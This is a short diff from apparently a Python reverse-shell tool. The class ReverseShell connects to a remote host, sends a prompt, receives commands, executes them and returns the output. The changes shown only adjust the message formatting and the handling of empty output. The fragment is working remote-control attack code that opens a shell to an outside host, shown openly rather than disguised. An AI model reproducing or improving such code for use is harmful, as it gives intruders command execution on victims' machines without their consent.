@@ -63,16 +63,19 @@ class ReverseShell:
             ReverseShell.__cSoc.connect((target, port))
             ReverseShell.__readBuffer, _, _ = select([ReverseShell.__cSoc], [], [], 0)
             prompt = "{}>".format(gethostname())
-            ReverseShell.sendStuff("***Connection Established***\n")
+            ReverseShell.sendStuff("*** Connection Established ***\n")
             while RUNNING.is_set():
                 ReverseShell.sendStuff(prompt)
                 cmd = ReverseShell.recvStuff()
                 if cmd == "exit" or cmd == "close":
-                    ReverseShell.sendStuff("***Closing the connection***")
+                    ReverseShell.sendStuff("*** Closing the connection ***")
                     ReverseShell.__cSoc.close()
                     break
                 res = ReverseShell.executeCommand(cmd)
-                ReverseShell.sendStuff(res)
+                if res != "":
+                    ReverseShell.sendStuff(res)
+                else:
+                    ReverseShell.sendStuff("\n")
         except Exception:
             return
 
